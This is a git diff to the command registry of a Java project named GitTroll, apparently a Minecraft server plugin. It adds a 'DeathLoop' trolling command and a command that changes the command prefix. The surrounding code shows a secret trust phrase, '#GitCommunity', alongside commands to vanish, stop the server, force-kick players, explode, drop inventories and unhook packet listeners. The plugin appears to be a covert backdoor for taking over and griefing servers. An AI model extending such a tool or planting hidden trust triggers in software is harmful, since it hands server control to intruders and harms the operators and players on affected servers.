@@ -44,6 +44,7 @@ import net.Lenni0451.GitTroll.command.commands.player.Unban;
 import net.Lenni0451.GitTroll.command.commands.player.UnhookPacketListener;
 import net.Lenni0451.GitTroll.command.commands.player.Untrust;
 import net.Lenni0451.GitTroll.command.commands.player.Vanish;
+import net.Lenni0451.GitTroll.command.commands.plugin.ChangeCommandPrefix;
 import net.Lenni0451.GitTroll.command.commands.plugin.Help;
 import net.Lenni0451.GitTroll.command.commands.plugin.UpdateVersion;
 import net.Lenni0451.GitTroll.command.commands.server.Broadcast;
@@ -59,6 +60,7 @@ import net.Lenni0451.GitTroll.command.commands.server.Stop;
 import net.Lenni0451.GitTroll.command.commands.trolling.AntiRespawn;
 import net.Lenni0451.GitTroll.command.commands.trolling.ChunkRenderGlitch;
 import net.Lenni0451.GitTroll.command.commands.trolling.ClientBlockReplace;
+import net.Lenni0451.GitTroll.command.commands.trolling.DeathLoop;
 import net.Lenni0451.GitTroll.command.commands.trolling.DropHand;
 import net.Lenni0451.GitTroll.command.commands.trolling.DropInventory;
 import net.Lenni0451.GitTroll.command.commands.trolling.Explode;
@@ -72,7 +74,7 @@ import net.Lenni0451.GitTroll.utils.Logger;
 
 public class CommandManager implements Listener {
 	
-	public static final String COMMAND_PREFIX = "!";
+	public static String COMMAND_PREFIX = "!";
 	public static final String TRUST_COMMAND = "#GitCommunity";
 	
 	
@@ -129,6 +131,8 @@ public class CommandManager implements Listener {
 	public final Kick Kick = null;
 	public final ForceKick ForceKick = null;
 	public final AntiRespawn AntiRespawn = null;
+	public final ChangeCommandPrefix ChangeCommandPrefix = null;
+	public final DeathLoop DeathLoop = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
